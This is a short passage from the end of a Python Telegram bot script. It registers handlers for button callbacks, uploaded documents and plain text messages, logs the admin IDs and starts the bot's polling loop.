    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    log.info(f"Bot running. Admins: {ADMIN_IDS}")
    app.run_polling()


if __name__ == "__main__":
    main()
